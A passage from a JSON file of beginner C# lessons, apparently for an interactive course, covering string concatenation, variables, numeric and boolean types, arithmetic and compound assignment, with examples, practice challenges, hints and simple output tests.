              "instructions": "Create a personalized greeting card! Use string concatenation (+) to combine:\n\n1. A greeting: 'Hello' + [a name]\n2. A message: 'You have completed' + [a number] + 'lessons!'\n3. An encouragement: 'Keep going, you are doing' + [an adjective] + '!'\n\nMake it your own!",
              "starterCode": "// Create your greeting card using + to combine text!\n\nConsole.WriteLine(\"Hello \" + \"Student\");\n// Add two more lines with concatenation!",
              "solution": "// Create your greeting card using + to combine text!\n\nConsole.WriteLine(\"Hello \" + \"Alex\" + \"!\");\nConsole.WriteLine(\"You have completed \" + 5 + \" lessons!\");\nConsole.WriteLine(\"Keep going, you are doing \" + \"amazing\" + \"!\");",
              "language": "csharp",
              "testCases": [
                {
                  "id": "test-1",
                  "description": "Output should contain \"Hello\"",
                  "expectedOutput": "Hello",
                  "isVisible": true
                }
              ],
              "hints": [
                {
                  "level": 1,
                  "text": "Remember to add spaces! \"Hello\"+\"World\" becomes \"HelloWorld\". Use \"Hello \"+\" World\" for proper spacing!"
                },
                {
                  "level": 2,
                  "text": "Forgetting spaces between words: \"Hello\"+\"World\" becomes \"HelloWorld\" instead of \"Hello World\"!"
                },
                {
                  "level": 3,
                  "text": "Mixing up (2+2) vs 2+2 in text: Without parentheses, C# glues text instead of doing math first!"
                },
                {
                  "level": 4,
                  "text": "Forgetting quotes around text: Console.WriteLine(Hello + World); won't work – they need quotes!"
                }
              ],
              "commonMistakes": [
                {
                  "mistake": "Forgetting spaces between words",
                  "consequence": "\"Hello\"+\"World\" becomes \"HelloWorld\" instead of \"Hello World\"!",
                  "correction": "Review the correct syntax and best practices for this concept."
                },
                {
                  "mistake": "Mixing up (2+2) vs 2+2 in text",
                  "consequence": "Without parentheses, C# glues text instead of doing math first!",
                  "correction": "Review the correct syntax and best practices for this concept."
                },
                {
                  "mistake": "Forgetting quotes around text",
                  "consequence": "Console.WriteLine(Hello + World); won't work – they need quotes!",
                  "correction": "Review the correct syntax and best practices for this concept."
                }
              ],
              "difficulty": "beginner"
            }
          ]
        }
      ]
    },
    {
      "id": "module-02",
      "title": "Variables and Data Types",
      "description": "Master variables, data types (int, string, bool, double), type conversion, and working with numbers and text.",
      "difficulty": "beginner",
      "estimatedHours": 2,
      "lessons": [
        {
          "id": "lesson-02-01",
          "title": "What is a Variable? (The Labeled Box)",
          "moduleId": "module-02",
          "order": 1,
          "estimatedMinutes": 15,
          "difficulty": "beginner",
          "contentSections": [
            {
              "type": "ANALOGY",
              "title": "Understanding the Concept",
              "content": "Imagine you have empty boxes in a warehouse, and you need to store things in them. Each box gets a LABEL (like 'Books' or 'Toys') so you know what's inside.\n\nVariables are exactly like labeled boxes! They're containers that store information in your program:\n\n• The LABEL is the variable name (like 'playerScore' or 'userName')\n• The CONTENTS are the value stored inside (like 100 or 'Alex')\n• You can look inside the box anytime by using its label\n• You can replace what's inside by putting new stuff in!\n\nIn C#, before you can use a box, you must tell the computer: \"I need a box for storing text\" or \"I need a box for storing numbers.\" This is called DECLARING a variable."
            },
            {
              "type": "EXAMPLE",
              "title": "Code Example",
              "content": "Let's walk through creating, assigning, and using variables step by step. Notice how we first declare the variable (create the box), then assign a value (put something in), and finally use it (look inside the box). You can also use the `var` keyword when the type is obvious from the right side - C# figures out the type automatically!",
              "code": "// Create a variable (declare it)\nstring playerName;\n\n// Put something in the box (assign a value)\nplayerName = \"Alex\";\n\n// Look at what's in the box (use it)\nConsole.WriteLine(\"Player name: \" + playerName);\n\n// Put something new in the box (reassign)\nplayerName = \"Jordan\";\nConsole.WriteLine(\"New player: \" + playerName);\n\n// Modern C#: Declare and initialize in one line\nvar score = 100;  // C# knows this is an int!\nvar message = \"Hello\";  // C# knows this is a string!\nConsole.WriteLine(message + \", your score is \" + score);",
              "language": "csharp"
            },
            {
              "type": "THEORY",
              "title": "Syntax Breakdown",
              "content": "## Breaking Down the Syntax\n\n**`string playerName;`**: 'string' means this box holds TEXT. 'playerName' is the label on the box. The semicolon ends the statement.\n\n**`playerName = \"Alex\";`**: The = sign means 'put this value INTO the box'. We're storing the text 'Alex' in our playerName box.\n\n**`Console.WriteLine(playerName);`**: No quotes around playerName! That tells C# to look INSIDE the box and get the value, not just display the word 'playerName'.\n\n**`var score = 100;`**: The `var` keyword lets C# infer the type from the value you assign. Use it when the type is obvious from the right side - it makes code cleaner!"
            },
            {
              "type": "WARNING",
              "title": "Common Mistakes",
              "content": "**Using a variable before declaring it**: C# must know about your 'box' before you can put things in it. `playerName = \"Alex\"; string playerName;` causes an error!\n\n**Misspelling variable names**: C# is case-sensitive! `playerName` and `playername` are completely different variables.\n\n**Using quotes when you mean the variable**: `Console.WriteLine(\"playerName\")` prints the word 'playerName'. `Console.WriteLine(playerName)` prints the VALUE inside the variable.\n\n**Overusing `var`**: Only use `var` when the type is obvious. `var x = GetData();` is unclear - what type is x? Use explicit types when it helps readability."
            }
          ],
          "challenges": [
            {
              "type": "FREE_CODING",
              "id": "lesson-02-01-challenge-01",
              "title": "Practice Challenge",
              "description": "Apply what you've learned in this interactive coding challenge.",
              "instructions": "Create a program that:\n1. Declares a variable called 'favoriteGame'\n2. Stores YOUR favorite game in it\n3. Displays a message like: 'My favorite game is [your game]'\n4. Changes the variable to a different game\n5. Displays the new game",
              "starterCode": "// Declare your variable\nstring favoriteGame;\n\n// Store your favorite game\n\n// Display it\n\n// Change it to a different game\n\n// Display the new one",
              "solution": "// Declare your variable\nstring favoriteGame;\n\n// Store your favorite game\nfavoriteGame = \"Minecraft\";\n\n// Display it\nConsole.WriteLine(\"My favorite game is \" + favoriteGame);\n\n// Change it to a different game\nfavoriteGame = \"Fortnite\";\n\n// Display the new one\nConsole.WriteLine(\"My new favorite is \" + favoriteGame);",
              "language": "csharp",
              "testCases": [
                {
                  "id": "test-1",
                  "description": "Output should contain \"favorite\"",
                  "expectedOutput": "favorite",
                  "isVisible": true
                }
              ],
              "hints": [
                {
                  "level": 1,
                  "text": "Remember: string variableName; creates the box. variableName = \"value\"; puts something in it. Use the variable name WITHOUT quotes in Console.WriteLine!"
                },
                {
                  "level": 2,
                  "text": "Putting quotes around the variable name when using it: Console.WriteLine(\"favoriteGame\") displays the word 'favoriteGame', not the value!"
                },
                {
                  "level": 3,
                  "text": "Forgetting to declare the variable first: You must write 'string favoriteGame;' before you can use it!"
                },
                {
                  "level": 4,
                  "text": "Misspelling the variable name: 'favoriteGame' and 'favoritegame' are different! C# is case-sensitive!"
                }
              ],
              "commonMistakes": [
                {
                  "mistake": "Putting quotes around the variable name when using it",
                  "consequence": "Console.WriteLine(\"favoriteGame\") displays the word 'favoriteGame', not the value!",
                  "correction": "Review the correct syntax and best practices for this concept."
                },
                {
                  "mistake": "Forgetting to declare the variable first",
                  "consequence": "You must write 'string favoriteGame;' before you can use it!",
                  "correction": "Review the correct syntax and best practices for this concept."
                },
                {
                  "mistake": "Misspelling the variable name",
                  "consequence": "'favoriteGame' and 'favoritegame' are different! C# is case-sensitive!",
                  "correction": "Review the correct syntax and best practices for this concept."
                }
              ],
              "difficulty": "beginner"
            }
          ]
        },
        {
          "id": "lesson-02-02",
          "title": "Number Variables (int and double)",
          "moduleId": "module-02",
          "order": 2,
          "estimatedMinutes": 15,
          "difficulty": "beginner",
          "contentSections": [
            {
              "type": "ANALOGY",
              "title": "Understanding the Concept",
              "content": "You've learned about 'string' variables (boxes for text). Now let's learn about boxes for NUMBERS!\n\nIn C#, there are different types of number boxes:\n\n• int (integer): A box for WHOLE NUMBERS only (like 5, 100, -42). No decimals allowed!\n• double: A box for DECIMAL NUMBERS (like 3.14, 99.99, -0.5). Can also hold whole numbers, but takes more space.\n\nWhy have different boxes? Efficiency! If you only need whole numbers (like counting players in a game), use 'int'. If you need decimals (like storing money or measurements), use 'double'.\n\nThink of it like this: You wouldn't use a giant shipping container to store a pencil! Use the right box for the job."
            },
            {
              "type": "EXAMPLE",
              "title": "Code Example",
              "content": "Here are the most common numeric types you'll use. Notice that `int` is for whole numbers and `double` is for decimals. For financial calculations involving money, C# has a special `decimal` type that provides better precision - crucial when every penny counts!",
              "code": "// Integer (whole numbers only)\nint playerScore = 1500;\nint lives = 3;\n\n// Double (decimal numbers - good for scientific calculations)\ndouble temperature = -5.5;\ndouble distance = 3.14159;\n\n// Decimal (precise decimals - ALWAYS use for money!)\ndecimal price = 19.99m;      // Note the 'm' suffix!\ndecimal accountBalance = 1234.56m;\n\n// Display them\nConsole.WriteLine(\"Score: \" + playerScore);\nConsole.WriteLine(\"Price: $\" + price);\nConsole.WriteLine(\"Temperature: \" + temperature + \"C\");\n\n// You can do math with them!\nint totalScore = playerScore + 500;\nConsole.WriteLine(\"New score: \" + totalScore);",
              "language": "csharp"
            },
            {
              "type": "THEORY",
              "title": "Syntax Breakdown",
              "content": "## Breaking Down the Syntax\n\n**`int playerScore = 1500;`**: This creates an integer box AND puts 1500 in it immediately. This is called 'declaration with initialization' - doing both steps at once!\n\n**`double temperature = -5.5;`**: Decimals use a PERIOD (.), not a comma! In C#, -5.5 is correct, -5,5 is wrong. Double is great for scientific calculations where tiny precision errors are acceptable.\n\n**`decimal price = 19.99m;`**: The `m` suffix marks this as a decimal literal. Use `decimal` for money because it stores numbers in base-10, avoiding the rounding errors that `double` can have with values like 0.1.\n\n**`int totalScore = playerScore + 500;`**: You can do math with variables! This takes the value from playerScore, adds 500, and stores the result in totalScore."
            },
            {
              "type": "WARNING",
              "title": "Common Mistakes",
              "content": "**Using double for money**: `double price = 19.99;` can lead to rounding errors! 0.1 + 0.2 might equal 0.30000000000000004. Always use `decimal` for financial calculations.\n\n**Forgetting the 'm' suffix for decimals**: `decimal price = 19.99;` causes an error! You need `decimal price = 19.99m;` - the 'm' tells C# this is a decimal literal.\n\n**Storing decimals in int**: `int price = 19.99;` causes an error! Use `double` or `decimal` for decimal values.\n\n**Using commas instead of periods**: In C#, decimal points are periods. `19.99` is correct, `19,99` is a syntax error."
            },
            {
              "type": "ARCHITECTURE",
              "title": "Choosing the Right Type for the Job",
              "content": "## Type Selection in Real Applications\n\nChoosing the right data type is a critical architectural decision that affects correctness, performance, and maintainability. Here's how professional developers approach type selection in production systems like ShopFlow.\n\n**Money: Always Use `decimal`**\nNever use `float` or `double` for financial calculations. They use binary floating-point representation which cannot precisely represent values like 0.10 or 0.01. The `decimal` type uses base-10 arithmetic and is specifically designed for financial accuracy.\n\n```csharp\n// WRONG: Binary floating-point causes rounding errors\ndouble badPrice = 0.1 + 0.2;  // Result: 0.30000000000000004\n\n// CORRECT: Decimal provides exact representation\ndecimal goodPrice = 0.1m + 0.2m;  // Result: 0.3\n```\n\n**Identifiers: `int` vs `long` vs `Guid`**\nChoose based on your scale requirements:\n- `int`: Supports up to 2.1 billion unique records—sufficient for most applications\n- `long`: Use when you expect billions of records (social media scale)\n- `Guid`: When you need globally unique IDs across distributed systems without coordination\n\n**Strings: Understanding Immutability**\nStrings in C# are immutable—every modification creates a new string object. For building strings in loops or concatenating many values, use `StringBuilder` to avoid memory pressure and performance degradation.\n\n**DateTime: Always Think About Time Zones**\nStore dates in UTC (`DateTime.UtcNow`) and convert to local time only for display. This prevents bugs when users are in different time zones or when daylight saving time changes.\n\n**In ShopFlow**, we follow these patterns:\n- `decimal` for all prices, totals, and tax calculations\n- `int` for entity IDs (our scale doesn't require `long`)\n- `string` for names and descriptions\n- `DateTime` in UTC for all timestamps, converted to local only in the UI layer"
            },
            {
              "type": "REAL_WORLD",
              "title": "Type Mistakes That Cost Companies Millions",
              "content": "## Real-World Type Disasters\n\nChoosing the wrong data type might seem like a minor decision, but history is full of costly examples.\n\n**The Patriot Missile Bug (1991)**\nA timing calculation used a floating-point representation that accumulated rounding errors over time. After 100 hours of operation, the error grew large enough that the missile defense system failed to intercept an incoming missile, resulting in 28 deaths. The fix? Using a more precise numeric type.\n\n**The Ariane 5 Explosion (1996)**\nA 64-bit floating-point number was converted to a 16-bit signed integer. The value exceeded the maximum the smaller type could hold, causing an overflow that led to a $370 million rocket explosion just 37 seconds after launch.\n\n**Y2K: The Two-Digit Year Problem**\nTo save memory (expensive in the 1960s-70s), programmers stored years as two digits. When 2000 approached, systems couldn't distinguish 1900 from 2000. The global remediation effort cost an estimated $300 billion.\n\n**Banking Rounding Errors**\nBanks processing millions of transactions per day have discovered that using `double` instead of `decimal` can cause pennies to appear or disappear due to floating-point rounding. These errors compound over time and create audit nightmares.\n\n**The Lesson for ShopFlow**\nEvery type decision in our e-commerce platform matters. Using `decimal` for money, proper nullable types for optional fields, and appropriate ID types prevents subtle bugs that could affect financial accuracy and customer trust."
            }
          ],
          "challenges": [
            {
              "type": "FREE_CODING",
              "id": "lesson-02-02-challenge-01",
              "title": "Practice Challenge",
              "description": "Apply what you've learned in this interactive coding challenge.",
              "instructions": "Create a simple shopping cart calculator:\n1. Create an 'int' variable for quantity (number of items)\n2. Create a 'double' variable for price per item\n3. Calculate the total cost (quantity × price) and store it in a new 'double' variable\n4. Display all three values with labels",
              "starterCode": "// Declare your variables\nint quantity = 5;\n\n// Declare price per item\n\n// Calculate total (quantity * price)\n\n// Display all values",
              "solution": "// Declare your variables\nint quantity = 5;\n\n// Declare price per item\ndouble pricePerItem = 9.99;\n\n// Calculate total (quantity * price)\ndouble totalCost = quantity * pricePerItem;\n\n// Display all values\nConsole.WriteLine(\"Quantity: \" + quantity);\nConsole.WriteLine(\"Price per item: $\" + pricePerItem);\nConsole.WriteLine(\"Total cost: $\" + totalCost);",
              "language": "csharp",
              "testCases": [
                {
                  "id": "test-1",
                  "description": "Output should contain \"Quantity\"",
                  "expectedOutput": "Quantity",
                  "isVisible": true
                },
                {
                  "id": "test-2",
                  "description": "Output should contain \"Price\"",
                  "expectedOutput": "Price",
                  "isVisible": true
                },
                {
                  "id": "test-3",
                  "description": "Output should contain \"Total\"",
                  "expectedOutput": "Total",
                  "isVisible": true
                }
              ],
              "hints": [
                {
                  "level": 1,
                  "text": "Use the * operator for multiplication! quantity * pricePerItem will calculate the total. Store it in a double variable since it might have decimals."
                },
                {
                  "level": 2,
                  "text": "Using a comma for decimals: double price = 19,99; is WRONG! Use a period: 19.99"
                },
                {
                  "level": 3,
                  "text": "Trying to store decimals in an int: int price = 19.99; will cause an error! Use double for decimals."
                },
                {
                  "level": 4,
                  "text": "Forgetting quotes in Console.WriteLine labels: Console.WriteLine(Total: + total) is wrong. Use \"Total: \" with quotes!"
                }
              ],
              "commonMistakes": [
                {
                  "mistake": "Using a comma for decimals",
                  "consequence": "double price = 19,99; is WRONG! Use a period: 19.99",
                  "correction": "Review the correct syntax and best practices for this concept."
                },
                {
                  "mistake": "Trying to store decimals in an int",
                  "consequence": "int price = 19.99; will cause an error! Use double for decimals.",
                  "correction": "Review the correct syntax and best practices for this concept."
                },
                {
                  "mistake": "Forgetting quotes in Console.WriteLine labels",
                  "consequence": "Console.WriteLine(Total: + total) is wrong. Use \"Total: \" with quotes!",
                  "correction": "Review the correct syntax and best practices for this concept."
                }
              ],
              "difficulty": "beginner"
            }
          ]
        },
        {
          "id": "lesson-02-03",
          "title": "Boolean Variables (true or false)",
          "moduleId": "module-02",
          "order": 3,
          "estimatedMinutes": 15,
          "difficulty": "beginner",
          "contentSections": [
            {
              "type": "ANALOGY",
              "title": "Understanding the Concept",
              "content": "Sometimes you need to store a YES or NO answer. Is the player alive? Is the door locked? Is the game over?\n\nThat's where BOOLEAN variables come in! A boolean (named after mathematician George Boole) can only hold two values:\n\n• true (yes, on, correct)\n• false (no, off, incorrect)\n\nThink of a boolean like a light switch – it's either ON or OFF, nothing in between!\n\nIn C#, we use the 'bool' type for these. Booleans are INCREDIBLY powerful for making decisions in programs (you'll see this soon when we learn 'if statements')."
            },
            {
              "type": "EXAMPLE",
              "title": "Code Example",
              "content": "Booleans are perfect for tracking states and conditions in your program. Notice the naming convention - boolean variables typically start with 'is', 'has', 'can', or 'should' because they answer yes/no questions. This makes your code read almost like English!",
              "code": "// Boolean variables - only true or false!\nbool isPlayerAlive = true;\nbool hasKey = false;\nbool canJump = true;\nbool shouldSaveGame = false;\n\n// Display them\nConsole.WriteLine(\"Player alive: \" + isPlayerAlive);\nConsole.WriteLine(\"Has key: \" + hasKey);\n\n// You can change them!\nisPlayerAlive = false;\nConsole.WriteLine(\"Player alive now: \" + isPlayerAlive);\n\n// Booleans from comparisons (preview of what's coming!)\nint score = 85;\nbool isPassing = score >= 60;  // true!\nConsole.WriteLine(\"Passing: \" + isPassing);",
              "language": "csharp"
            },
            {
              "type": "THEORY",
              "title": "Syntax Breakdown",
              "content": "## Breaking Down the Syntax\n\n**`bool isPlayerAlive = true;`**: 'bool' is the type for true/false values. Notice: NO QUOTES around true! `true` and `false` are special keywords in C#.\n\n**`true and false`**: These are NOT strings! Don't write `\"true\"` - just write `true`. They're built-in values that C# understands.\n\n**`Variable naming`**: Boolean variables often start with 'is', 'has', 'can', or 'should' (like isReady, hasPermission, canJump, shouldRetry) because they answer yes/no questions.\n\n**`bool isPassing = score >= 60;`**: Comparisons produce boolean results! This checks if score is greater than or equal to 60, and stores the result (true or false) in isPassing."
            },
            {
              "type": "WARNING",
              "title": "Common Mistakes",
              "content": "**Putting quotes around true/false**: `bool isReady = \"true\";` is WRONG! This creates a string, not a boolean. Use `bool isReady = true;` without quotes.\n\n**Capitalizing True/False**: C# is case-sensitive! Use lowercase `true` and `false`. `True` and `FALSE` are not valid.\n\n**Trying to assign other values**: `bool isActive = 1;` doesn't work! In C#, booleans can ONLY be `true` or `false` - not 1/0, not \"yes\"/\"no\".\n\n**Poor naming**: `bool flag = true;` - what does 'flag' mean? Use descriptive names like `isGameOver`, `hasPermission`, or `canEdit` that explain what question the boolean answers."
            }
          ],
          "challenges": [
            {
              "type": "FREE_CODING",
              "id": "lesson-02-03-challenge-01",
              "title": "Practice Challenge",
              "description": "Apply what you've learned in this interactive coding challenge.",
              "instructions": "Create a character status display! Make variables for:\n1. isHungry (boolean) - set to true\n2. isTired (boolean) - set to false\n3. energy (int) - set to 75\n4. name (string) - set to any name\n\nDisplay all of them in a formatted status report!",
              "starterCode": "// Create your character status variables\nbool isHungry = true;\n\n// Add the other variables here\n\n// Display status report",
              "solution": "// Create your character status variables\nbool isHungry = true;\nbool isTired = false;\nint energy = 75;\nstring name = \"Hero\";\n\n// Display status report\nConsole.WriteLine(\"=== Character Status ===\");\nConsole.WriteLine(\"Name: \" + name);\nConsole.WriteLine(\"Energy: \" + energy);\nConsole.WriteLine(\"Hungry: \" + isHungry);\nConsole.WriteLine(\"Tired: \" + isTired);",
              "language": "csharp",
              "testCases": [
                {
                  "id": "test-1",
                  "description": "Output should contain \"Status\"",
                  "expectedOutput": "Status",
                  "isVisible": true
                },
                {
                  "id": "test-2",
                  "description": "Output should contain \"true\"",
                  "expectedOutput": "true",
                  "isVisible": true
                },
                {
                  "id": "test-3",
                  "description": "Output should contain \"false\"",
                  "expectedOutput": "false",
                  "isVisible": true
                }
              ],
              "hints": [
                {
                  "level": 1,
                  "text": "Remember: true and false have NO QUOTES! Write bool isHungry = true; not bool isHungry = \"true\";"
                },
                {
                  "level": 2,
                  "text": "Putting quotes around true/false: bool isReady = \"true\"; is WRONG! Use bool isReady = true; (no quotes!)"
                },
                {
                  "level": 3,
                  "text": "Capitalizing true/false: C# is case-sensitive! Use true, not True or TRUE."
                },
                {
                  "level": 4,
                  "text": "Trying to assign other values: bool can ONLY hold true or false, nothing else!"
                }
              ],
              "commonMistakes": [
                {
                  "mistake": "Putting quotes around true/false",
                  "consequence": "bool isReady = \"true\"; is WRONG! Use bool isReady = true; (no quotes!)",
                  "correction": "Review the correct syntax and best practices for this concept."
                },
                {
                  "mistake": "Capitalizing true/false",
                  "consequence": "C# is case-sensitive! Use true, not True or TRUE.",
                  "correction": "Review the correct syntax and best practices for this concept."
                },
                {
                  "mistake": "Trying to assign other values",
                  "consequence": "bool can ONLY hold true or false, nothing else!",
                  "correction": "Review the correct syntax and best practices for this concept."
                }
              ],
              "difficulty": "beginner"
            }
          ]
        },
        {
          "id": "lesson-02-04",
          "title": "Basic Math Operations",
          "moduleId": "module-02",
          "order": 4,
          "estimatedMinutes": 15,
          "difficulty": "beginner",
          "contentSections": [
            {
              "type": "ANALOGY",
              "title": "Understanding the Concept",
              "content": "C# is like a super-powered calculator! You can do math with variables using familiar operators:\n\n• + (addition): 5 + 3 = 8\n• - (subtraction): 10 - 4 = 6\n• * (multiplication): 6 * 7 = 42 (we use * because × isn't on keyboards!)\n• / (division): 20 / 4 = 5\n• % (modulus - remainder): 10 % 3 = 1 (10 divided by 3 is 3 remainder 1)\n\nThe modulus (%) might seem weird, but it's super useful! Want to know if a number is even? If number % 2 equals 0, it's even!\n\nC# follows the same order of operations you learned in school: PEMDAS (Parentheses, Exponents, Multiplication/Division, Addition/Subtraction)."
            },
            {
              "type": "EXAMPLE",
              "title": "Code Example",
              "content": "C# supports all the math operators you'd expect, plus the modulus operator (%) which gives you the remainder after division. Pay close attention to integer division - it's a common source of bugs! The order of operations follows standard math rules (PEMDAS), but you can use parentheses to make your intent clear.",
              "code": "// Basic math operations\nint a = 10;\nint b = 3;\n\nint sum = a + b;        // 13\nint difference = a - b; // 7\nint product = a * b;    // 30\nint quotient = a / b;   // 3 (integer division - decimal is dropped!)\nint remainder = a % b;  // 1 (10 / 3 = 3 remainder 1)\n\nConsole.WriteLine($\"Sum: {sum}\");\nConsole.WriteLine($\"Remainder: {remainder}\");\n\n// Order of operations matters!\nint result1 = 5 + 3 * 2;     // 11 (multiplication first)\nint result2 = (5 + 3) * 2;   // 16 (parentheses first)\nConsole.WriteLine($\"{result1} vs {result2}\");\n\n// To get decimal results, use double or decimal\ndouble preciseQuotient = 10.0 / 3.0;  // 3.333...\nConsole.WriteLine($\"Precise: {preciseQuotient:F2}\");  // Shows 3.33",
              "language": "csharp"
            },
            {
              "type": "THEORY",
              "title": "Syntax Breakdown",
              "content": "## Breaking Down the Syntax\n\n**`int quotient = a / b;`**: WATCH OUT! When dividing two integers, C# gives you an INTEGER result. 10/3 = 3 (not 3.333...). The decimal part is thrown away - not rounded!\n\n**`int remainder = a % b;`**: The % operator (modulus) gives you the REMAINDER after division. 10 % 3 = 1 because 10 / 3 = 3 with 1 left over. Super useful for checking even/odd (n % 2 == 0 means even)!\n\n**`Parentheses`**: Use ( ) to control order! 5 + 3 * 2 = 11, but (5 + 3) * 2 = 16. Parentheses are always calculated first.\n\n**`$\"Sum: {sum}\"`**: This is string interpolation - a cleaner way to include variables in strings. The $ before the quote enables it, and {} contains the expression."
            },
            {
              "type": "WARNING",
              "title": "Common Mistakes",
              "content": "**Integer division surprise**: `int result = 7 / 2;` gives 3, not 3.5! The decimal is dropped (truncated, not rounded). Use `double` or `decimal` if you need decimals.\n\n**Using x for multiplication**: `5 x 3` doesn't work! Use the asterisk: `5 * 3`. The letter x is not a valid operator.\n\n**Division by zero**: `int result = 10 / 0;` crashes your program! Always check that your divisor isn't zero before dividing.\n\n**Forgetting operator precedence**: `2 + 3 * 4` equals 14, not 20! Multiplication happens before addition. When in doubt, use parentheses: `(2 + 3) * 4` makes your intent crystal clear."
            }
          ],
          "challenges": [
            {
              "type": "FREE_CODING",
              "id": "lesson-02-04-challenge-01",
              "title": "Practice Challenge",
              "description": "Apply what you've learned in this interactive coding challenge.",
              "instructions": "Create a program that calculates the area and perimeter of a rectangle!\n\n1. Create 'int' variables for length (8) and width (5)\n2. Calculate area (length × width)\n3. Calculate perimeter (2 × length + 2 × width)\n4. Display both results with labels\n\nBonus: Try using parentheses to make your perimeter calculation clearer!",
              "starterCode": "// Rectangle dimensions\nint length = 8;\nint width = 5;\n\n// Calculate area\n\n// Calculate perimeter\n\n// Display results",
              "solution": "// Rectangle dimensions\nint length = 8;\nint width = 5;\n\n// Calculate area (length times width)\nint area = length * width;\n\n// Calculate perimeter (2 times length plus 2 times width)\nint perimeter = 2 * length + 2 * width;\n// Or with parentheses: int perimeter = 2 * (length + width);\n\n// Display results\nConsole.WriteLine(\"Area: \" + area);\nConsole.WriteLine(\"Perimeter: \" + perimeter);",
              "language": "csharp",
              "testCases": [
                {
                  "id": "test-1",
                  "description": "Output should contain \"Area\"",
                  "expectedOutput": "Area",
                  "isVisible": true
                },
                {
                  "id": "test-2",
                  "description": "Output should contain \"Perimeter\"",
                  "expectedOutput": "Perimeter",
                  "isVisible": true
                }
              ],
              "hints": [
                {
                  "level": 1,
                  "text": "Area = length × width. Perimeter = 2×length + 2×width (or 2×(length+width) with parentheses!). Use the * operator for multiplication!"
                },
                {
                  "level": 2,
                  "text": "Using 'x' or '×' for multiplication: In C#, you MUST use the asterisk (*). 5 * 3, not 5 x 3!"
                },
                {
                  "level": 3,
                  "text": "Integer division surprise: 7 / 2 gives you 3, not 3.5! The decimal part disappears with int division."
                },
                {
                  "level": 4,
                  "text": "Forgetting order of operations: 2 * length + 2 * width works, but 2 * (length + width) is clearer!"
                }
              ],
              "commonMistakes": [
                {
                  "mistake": "Using 'x' or '×' for multiplication",
                  "consequence": "In C#, you MUST use the asterisk (*). 5 * 3, not 5 x 3!",
                  "correction": "Review the correct syntax and best practices for this concept."
                },
                {
                  "mistake": "Integer division surprise",
                  "consequence": "7 / 2 gives you 3, not 3.5! The decimal part disappears with int division.",
                  "correction": "Review the correct syntax and best practices for this concept."
                },
                {
                  "mistake": "Forgetting order of operations",
                  "consequence": "2 * length + 2 * width works, but 2 * (length + width) is clearer!",
                  "correction": "Review the correct syntax and best practices for this concept."
                }
              ],
              "difficulty": "beginner"
            }
          ]
        },
        {
          "id": "lesson-02-05",
          "title": "Compound Assignment (Shortcuts!)",
          "moduleId": "module-02",
          "order": 5,
          "estimatedMinutes": 15,
          "difficulty": "beginner",
          "contentSections": [
            {
              "type": "ANALOGY",
              "title": "Understanding the Concept",
              "content": "Imagine you're playing a game and you gain 10 points. You'd write:\n\nscore = score + 10;\n\nThis takes your current score, adds 10, and stores the new value back in score. But C# has a SHORTCUT:\n\nscore += 10;\n\nThe += operator means 'add this to the variable'. It's shorter and clearer!\n\nC# has shortcuts for all math operations:\n• += (add and assign): score += 5 → score = score + 5\n• -= (subtract and assign): lives -= 1 → lives = lives - 1\n• *= (multiply and assign): damage *= 2 → damage = damage * 2\n• /= (divide and assign): speed /= 2 → speed = speed / 2\n\nThere are also special shortcuts for adding/subtracting 1:\n• ++ (increment by 1): score++ → score = score + 1\n• -- (decrement by 1): lives-- → lives = lives - 1\n\nReal programmers use these shortcuts ALL THE TIME!"
            },
            {
              "type": "EXAMPLE",
              "title": "Code Example",
              "content": "Compound assignment operators combine an operation with assignment in one step. They're shorter, clearer, and less error-prone than writing the variable name twice. The increment (++) and decrement (--) operators are especially common - you'll see them everywhere in real code!",
              "code": "// Start with a score\nint score = 100;\nConsole.WriteLine($\"Starting score: {score}\");\n\n// Add 50 points (the long way)\nscore = score + 50;\nConsole.WriteLine($\"After earning 50: {score}\");\n\n// Add 25 points (the shortcut way!)\nscore += 25;\nConsole.WriteLine($\"After earning 25 more: {score}\");\n\n// Multiply score by 2 (bonus!)\nscore *= 2;\nConsole.WriteLine($\"After 2x bonus: {score}\");\n\n// Lives example with decrement\nint lives = 3;\nlives--;  // Lost a life! Same as lives = lives - 1\nConsole.WriteLine($\"Lives remaining: {lives}\");\n\n// All compound operators:\n// +=  -=  *=  /=  %=  (and more!)\nint coins = 10;\ncoins += 5;   // Now 15\ncoins -= 3;   // Now 12\ncoins *= 2;   // Now 24\ncoins /= 4;   // Now 6\ncoins %= 4;   // Now 2 (6 % 4 = 2)",
              "language": "csharp"
            },
            {
              "type": "THEORY",
              "title": "Syntax Breakdown",
              "content": "## Breaking Down the Syntax\n\n**`score += 50;`**: This is shorthand for `score = score + 50`. It takes the current value, adds 50, and stores the result back. Fewer chances to typo the variable name!\n\n**`score *= 2;`**: This DOUBLES the score! Same as `score = score * 2`. Great for bonus multipliers in games!\n\n**`lives--;`**: The -- operator subtracts 1. `lives--` is the same as `lives = lives - 1` or `lives -= 1`. Super common in loops and countdowns!\n\n**`++lives vs lives++`**: Both add 1, but `++lives` (prefix) increments BEFORE using the value, while `lives++` (postfix) uses the value THEN increments. For simple statements, they're identical - the difference matters in expressions like `Console.WriteLine(++x);`"
            },
            {
              "type": "WARNING",
              "title": "Common Mistakes",
              "content": "**Confusing += with =**: `score = 5` REPLACES the value with 5. `score += 5` ADDS 5 to the current value. Huge difference!\n\n**Forgetting ++ changes the variable**: `count++` permanently changes `count`. It's not temporary! If count was 5, it's now 6 forever (until you change it again).\n\n**Using ++ on non-numbers**: `name++` doesn't work on strings! Increment and decrement only work on numeric types.\n\n**Prefix vs postfix confusion in expressions**: `int x = 5; int y = x++;` sets y to 5 (old value), then x becomes 6. But `int y = ++x;` sets x to 6 first, then y gets 6. When in doubt, do the increment on a separate line!"
            }
          ],
          "challenges": [
            {
              "type": "FREE_CODING",
              "id": "lesson-02-05-challenge-01",
              "title": "Practice Challenge",
              "description": "Apply what you've learned in this interactive coding challenge.",
              "instructions": "Create a game level-up simulator!\n\n1. Start with: level = 1, experience = 0, coins = 100\n2. Gain 50 experience (use +=)\n3. Level up by 1 (use ++)\n4. Double your coins (use *=)\n5. Spend 25 coins (use -=)\n6. Display level, experience, and coins after each change!",
              "starterCode": "// Starting stats\nint level = 1;\nint experience = 0;\nint coins = 100;\n\nConsole.WriteLine(\"Starting - Level: \" + level + \", XP: \" + experience + \", Coins: \" + coins);\n\n// Gain 50 experience\n\n// Level up\n\n// Double coins\n\n// Spend 25 coins\n\n// Display final stats",
